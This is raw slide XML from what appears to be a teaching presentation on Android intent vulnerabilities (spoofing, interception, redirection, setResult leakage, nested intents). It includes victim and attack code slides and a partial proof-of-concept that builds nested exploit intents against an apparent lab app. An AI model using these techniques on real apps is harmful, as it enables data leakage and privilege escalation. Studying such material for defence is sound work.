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33"/>
    <p:restoredTop sz="94634"/>
  </p:normalViewPr>
  <p:slideViewPr>
    <p:cSldViewPr snapToGrid="0">
      <p:cViewPr varScale="1">
        <p:scale>
          <a:sx n="69" d="100"/>
          <a:sy n="69" d="100"/>
        </p:scale>
        <p:origin x="232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DD801-90AC-0B28-93AD-A562B1415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D5717-E1E9-8C8E-7B0E-0C3B9805E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3537F-2178-B0F0-E451-0ABFAF71F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CA6C-53A4-F14F-AE7B-8EE89A58DC3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27973-028A-289F-69D9-8A35E62BC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C1D71-214D-FBB4-62E3-4A90C3CFD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3C99-139C-584A-AA13-3A08A673C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2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D65C9-0113-6D1B-0D04-A8CBA3FB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055FC-1D43-0A81-4323-311A39C50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D094A-A0EC-D9A9-91C9-94136CC96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CA6C-53A4-F14F-AE7B-8EE89A58DC3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36631-CA31-0ABC-BDF2-A36B2CE6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9B5AB-AC9A-7A44-571B-8D2CB97B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3C99-139C-584A-AA13-3A08A673C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6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0D6B0-6093-D35D-B1BF-ACDC92239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524FB-8DE0-AD6C-17E3-5BD2341EC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E58C-8765-0EF7-91BF-B3BB8A748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CA6C-53A4-F14F-AE7B-8EE89A58DC3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4EEF0-FCFA-17BF-BF44-EA1A9EC18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350E0-3B77-FC62-E4B4-A913A44FC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3C99-139C-584A-AA13-3A08A673C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99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95C7-3666-6823-0C17-C7AD8B3DE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72649-334A-6F19-DD83-E04C8CE2E6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E03B4-1722-B488-95BF-CB7D0471B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677B1-718F-AB66-4EBF-2525A4AE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CA6C-53A4-F14F-AE7B-8EE89A58DC38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15E1F-7334-965E-3BED-855BE4BC3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B983F-9F05-6F4C-649D-5DCEC0BD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3C99-139C-584A-AA13-3A08A673C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725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57CE0-354F-1719-7450-428EC4791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9C26A-2110-95C1-754C-F472D948C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9E2AC-3A1B-B39E-A1FE-1A6283D06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DEC8E6-C3D5-27F8-8F73-56986802A4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4B26BE-5481-E446-908E-A33596057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4732DD-EFDA-CEAB-0DF5-E3E51D696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CA6C-53A4-F14F-AE7B-8EE89A58DC38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26024B-3B9E-C8EB-BADF-43928C4EB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FE94A9-2C1E-D5FE-609A-25F6F91BC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3C99-139C-584A-AA13-3A08A673C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1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A674E-00AB-519F-CDD7-1A1458FEF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7011C-C213-090C-6493-B6F008F49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CA6C-53A4-F14F-AE7B-8EE89A58DC38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F588BA-EB3D-9156-C92D-A04BE193A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2FCE4-D582-727A-B96E-320E8E81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3C99-139C-584A-AA13-3A08A673C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38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2EBF9-655B-A42C-106A-341AF8B5E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CA6C-53A4-F14F-AE7B-8EE89A58DC38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9D3918-AE9E-E39D-29CF-5FBEE7EF7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1A2EA-ED57-7527-35EB-7B12E0F7F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3C99-139C-584A-AA13-3A08A673C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2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F45EE-C1B0-8AAC-48AB-AFFC39F7D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851B5-C8B6-F63B-0512-2FC427236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CCDF46-5B8F-853E-EE55-C3E574E7E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47206-5164-B224-D69E-C60F5E03C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CA6C-53A4-F14F-AE7B-8EE89A58DC38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3CA23-3585-D1F9-6BDF-5269444EA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95050-D37B-AD9D-6A26-BBBEA2115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3C99-139C-584A-AA13-3A08A673C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26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A1C60-DB0C-A37C-AFF4-2B9FE388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240A9F-73C4-696F-3A56-105083FCC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CC691-D339-B3D2-65A9-953ED04AB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8EFAA-1126-F0D2-F877-BBF32EEA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CA6C-53A4-F14F-AE7B-8EE89A58DC38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7CDEC-36CF-B960-A74A-412B527A3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8884A-800B-CC94-41C6-281B6F2F6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3C99-139C-584A-AA13-3A08A673C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28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71397-0608-8FDF-49FC-2E2DBAC4A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01E43-DAE2-0309-B4BB-841DC354E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04128-4070-10E6-E6A5-9FC0C1016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CA6C-53A4-F14F-AE7B-8EE89A58DC3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BBBB0-9D50-660D-999A-F917BC721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89282-C494-DD9F-CD33-7FF84E54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3C99-139C-584A-AA13-3A08A673C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2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13EAC8-92C7-10C1-1852-06321715A8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7C41C-DC21-381F-ADED-D86859783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59270-7525-F0E5-FF99-3C1D26838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CA6C-53A4-F14F-AE7B-8EE89A58DC3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CBCFB-C96B-B1AE-F384-D9DDCFF07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07132-2D24-318C-F51C-688BBA14B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3C99-139C-584A-AA13-3A08A673C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5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2EB818-1BB7-D665-0AA4-27555ECAA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21A71-D1CE-CE32-93A4-C832ECD93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AD858-1264-EC8E-432B-1625896EE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6CA6C-53A4-F14F-AE7B-8EE89A58DC3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20D01-74F3-824F-0150-138813B3B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F8B3F-EEB9-9D2E-AB3C-069CC5D65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E3C99-139C-584A-AA13-3A08A673C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06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CB8E8B-8533-AA51-2AA2-695CC8228F0A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2960914" y="2854445"/>
            <a:ext cx="62701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</a:rPr>
              <a:t>Intent Vulnerabilities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C08F37-353A-2261-5D86-D2A7A5FBDF8F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="790302" y="219369"/>
            <a:ext cx="3135086" cy="2338252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Intent Spoofing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F1950-BC7D-90DC-4103-853A96F8A716}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="21017365">
            <a:off x="8963802" y="2076993"/>
            <a:ext cx="2351315" cy="218149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Intent Interception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2B8FAD7F-2E04-36B7-3853-B87F19F85DDC}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2449284" y="3970898"/>
            <a:ext cx="4173585" cy="2546840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Intent Redirection</a:t>
            </a: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7D0C37F-6D6E-5C48-8D73-E78AF2A79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76" y="-101600"/>
            <a:ext cx="206324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61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19108-1F9C-F8F8-38B3-D2DD990E0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phone&#10;&#10;AI-generated content may be incorrect.">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{67F81A52-E3C0-BB92-8406-086E6EC65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71B6A2F-5BBA-9CBF-0B84-B68E00D19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1" y="114300"/>
            <a:ext cx="1778000" cy="88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4239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3F59B44-1267-EF41-6487-AD4A80DB4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320" y="-13063"/>
            <a:ext cx="12243447" cy="6886939"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic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322E78D-2889-8B28-4434-BBA545802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576" y="-101600"/>
            <a:ext cx="206324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8BE4E-EF63-45BD-7DC2-B88F0B4D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C6348C-01C0-4EF6-34BD-897B97DD4D99}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="914400" y="2526639"/>
            <a:ext cx="104781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Intent interception</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="2400" dirty="0"/>
              <a:t> involves a malicious application receiving an intent that was not intended for it.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2400" dirty="0"/>
              <a:t>This can cause a leak of sensitive information. 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2400" dirty="0"/>
              <a:t>Intent interception takes place in both kinds of </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="2400" b="1" dirty="0"/>
              <a:t>intent (implicit or explicit)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="2400" dirty="0"/>
              <a:t>.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3DA74-8691-67D3-3205-5D2F9D3D5FD7}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3368967" y="513708"/>
            <a:ext cx="50555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I</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="4400" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>ntent</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="4400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Interception </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="4400" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRP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A05FBDA-72B1-A5AC-056D-7040719AA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76" y="-101600"/>
            <a:ext cx="206324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650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17D38-E3C8-7B6B-9AEB-3AED9779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phone and a cellphone&#10;&#10;AI-generated content may be incorrect.">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{23605FB6-4F95-46DA-FFAB-C8F85C51C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1FD9A5A-0EB4-846D-E1E2-A1EF7234C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576" y="-101600"/>
            <a:ext cx="206324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3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68C0-6E1D-A6B9-C8E4-68B6D5B64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FA72845-6A02-49CE-F5A1-3666C52E1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29" y="101601"/>
            <a:ext cx="7898945" cy="6643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2495EF-C4CC-99BF-5F9A-2685F1AD6192}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8053974" y="1816856"/>
            <a:ext cx="424542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sz="2000" b="1" dirty="0" err="1"/>
              <a:t>StartActivityForResult</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="2000" b="1" dirty="0"/>
              <a:t> (Intent, int)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="2000" dirty="0"/>
              <a:t> starts an activity and receives data through the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="2000" b="1" dirty="0" err="1"/>
              <a:t>onActivityResult</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="2000" b="1" dirty="0"/>
              <a:t> (int, int, Intent)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="2000" dirty="0"/>
              <a:t> method.  </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr fontAlgn="base"/>
            <a:endParaRPr lang="en-GB" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr fontAlgn="base"/>
            <a:r>
              <a:rPr lang="en-GB" sz="2000" dirty="0"/>
              <a:t>When the called activity exits, it can call </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="2000" b="1" dirty="0" err="1"/>
              <a:t>setResult</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="2000" b="1" dirty="0"/>
              <a:t> (int)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="2000" dirty="0"/>
              <a:t> to return data to the previous activity, and it can also choose to return an Intent through</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="2000" b="1" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="2000" b="1" dirty="0" err="1"/>
              <a:t>setResult</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="2000" b="1" dirty="0"/>
              <a:t> (int, Intent)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="2000" dirty="0"/>
              <a:t>, which contains all additional data for communication. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0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98ACA51-6052-D06D-CC15-C33411718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576" y="-101600"/>
            <a:ext cx="206324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5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2CAFF-B3F5-9742-95C2-925385CC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0E48539-855D-6252-3529-74EE3A879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72" y="5606180"/>
            <a:ext cx="5531939" cy="1251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42A8C0-3F43-DBDB-4C1E-50604133ADA6}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="123993" y="405570"/>
            <a:ext cx="120929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CASE 1: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="20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setResult</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB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() returns too much information, resulting in information leakage</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB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</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="20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3AE4ACB-3A40-922E-8580-F9E7418CF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04" y="1511300"/>
            <a:ext cx="7632700" cy="383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5945F7-60FE-52F1-E502-A3309711B42F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2142308" y="1067154"/>
            <a:ext cx="3324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Main code of Victim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E690CE-DC5D-F83E-0485-2ED2AC6AC2FE}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8369234" y="4614594"/>
            <a:ext cx="3777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err="1">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>setResult</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00B0F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>RESULT_OK, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>intent</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="2000" b="1" dirty="0"/>
              <a:t> – You send custom data back</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="2000" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2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CBF2DB-6486-5938-4647-C8F236F7986E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr>
            <a:cxnSpLocks/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipH="1">
            <a:off x="4506684" y="4937760"/>
            <a:ext cx="3780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BC12B76-CE70-14C9-832F-7808838E6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9608" y="5938080"/>
            <a:ext cx="206324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7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F60FA-A39A-304D-9902-BDC5E0532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C24F11-36FD-99E2-F66F-C9D7081E43F0}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3630009" y="1372869"/>
            <a:ext cx="40698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i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="WordVisi_MSFontService"/>
              </a:rPr>
              <a:t>Main code of Attack</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="36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4D38004-67C2-B53D-673A-9880DB116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100" y="2784357"/>
            <a:ext cx="9209799" cy="223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DC0389F-024C-C597-B109-1B0ECAAE1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576" y="-101600"/>
            <a:ext cx="206324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531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90C5D-35B7-AD1D-CEE7-891BF2367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31E626-9B10-21FC-9B24-2A2F4F7A0EF6}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="391885" y="269182"/>
            <a:ext cx="9167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CASE 2:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="2000" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="2000" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>setResult</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>() returns complete intent, resulting in permission elevation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E8C50-9E53-35E0-B960-B979F2021B42}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3268944" y="922981"/>
            <a:ext cx="36554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Main code of Victim</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB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lang="en-US" sz="2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117F805-662D-BA9A-B6F8-9474B1DAD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35341"/>
            <a:ext cx="10193312" cy="5461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5F8908-F7A0-1BEE-553D-C04409814009}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5290456" y="5388489"/>
            <a:ext cx="6589760" cy="120032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GB" sz="2400" b="1" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="188038"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Roboto Mono" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>setResult</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="2400" b="1" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="188038"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Roboto Mono" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="2400" b="1" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00B0F0"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Roboto Mono" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>RESULT_OK, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="2400" b="1" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Roboto Mono" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>getIntent</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="2400" b="1" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Roboto Mono" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>()</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="2400" b="1" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="188038"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Roboto Mono" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB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– You return the same data you got.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB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the original intent was attacker-controlled.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/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D4F800-7A8C-E429-F2E9-5C99EC47E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576" y="-101600"/>
            <a:ext cx="206324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606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43FEB-8876-6EE0-071D-E559CD20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D51DC2-E4DF-629F-BD98-F91C4B53E475}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3647000" y="511765"/>
            <a:ext cx="4160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Main code of Attack</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="32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1831691-8490-3360-864B-A1B92A97D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84" y="1294652"/>
            <a:ext cx="11369529" cy="182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E22D91-ECDA-BB4A-43A7-C5D4E5E37312}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3045502" y="3204150"/>
            <a:ext cx="6100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Attacker receives it like this</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="3200" b="1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US" sz="3200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6D381C81-9324-E4A0-3ADF-8F29EBD64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597" y="4320048"/>
            <a:ext cx="9810302" cy="2252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31B1C0-20AC-19E5-8CDE-1D4521C9F1E4}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1" y="3735274"/>
            <a:ext cx="120369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If someone starts your activity with a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600" b="1" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="188038"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Roboto Mono" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>content://</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="16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URI pointing to a contact, then your activity will send that exact URI back to them.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1600" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="WordVisiCarriageReturn_MSFontService"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-GB" sz="1600" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="WordVisiCarriageReturn_MSFontService"/>
              </a:rPr>
            </a:br>
            <a:endParaRPr lang="en-US" sz="1600" dirty="0"/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83E0A09-448C-057F-F5A5-F4AE6283D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576" y="-101600"/>
            <a:ext cx="206324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3573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025C1-2C85-F0D1-04EE-7DD0A53C9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A297F7-12E3-B678-7A4E-71E89E6D9640}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="226396" y="252098"/>
            <a:ext cx="3735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Nesting Of Intent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AA0149-E254-86D2-E60E-26DF3BAB3051}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="226396" y="866120"/>
            <a:ext cx="10459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Nesting of Intents</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t> means </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" b="1" dirty="0"/>
              <a:t>using one Intent inside another</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t> — basically, an Intent carries another Intent as extra data.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="image13.png">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{6EDAEE0C-9C75-EEC6-CADF-DBA3EE274F1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5316" y="1685109"/>
            <a:ext cx="9313815" cy="5135767"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln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06B1BB-DFDF-D716-76DD-72E2F8A49C29}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7968343" y="3592286"/>
            <a:ext cx="4068628" cy="25853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This code checks if the incoming intent has </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>another intent inside it</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> (a nested intent) with </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>specific data</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>, and based on that data, it either:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>✅ Calls a method named success(this), or</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>🚀 Starts another activity.</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0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3912573-5632-022E-5493-304078700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576" y="-101600"/>
            <a:ext cx="206324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65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7A231-4428-C09D-F9BF-F8948D91D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E959DE-DA7E-0130-7B67-E2171F6B10A5}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6096000" y="1518040"/>
            <a:ext cx="55386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Case1: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="3200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Calling success(this)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D018C-AA91-36DA-BE44-2B128CDA5C33}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6096000" y="2202622"/>
            <a:ext cx="5714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We want to trigger this part of the vulnerable code:</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="2000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="image5.png">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8E33AEBC-7380-63D5-7B97-19873378298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843134" y="2722426"/>
            <a:ext cx="6348866" cy="1353185"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln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BE4377-9122-6CF0-0A07-388487BBF305}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="293914" y="179978"/>
            <a:ext cx="6100354" cy="675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GB" sz="2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POC Code</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="2000" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF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// </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1800" dirty="0" err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nextIntent</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="18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-- Intent3</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="1800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solidFill>
                  <a:srgbClr val="F9267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 exploitIntent3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= </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1800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new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Intent()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;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exploitIntent3.putExtra(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="18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"reason"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"back");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// Intent2</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="1800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solidFill>
                  <a:srgbClr val="F9267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 exploitIntent2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= </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1800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new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Intent()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;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exploitIntent2.putExtra(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="18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"return"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42);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exploitIntent2.putExtra(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="18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r>
              <a:rPr lang="en-GB" sz="1800" dirty="0" err="1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nextIntent</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="18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exploitIntent3);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// Main Intent -- Intent1</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="1800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solidFill>
                  <a:srgbClr val="F9267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 exploitIntent1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= </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1800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new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Intent()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;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exploitIntent1.setClassName(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="18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r>
              <a:rPr lang="en-GB" sz="1800" dirty="0" err="1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io.hextree.attacksurface</a:t>
            </a:r>
            <a:r>
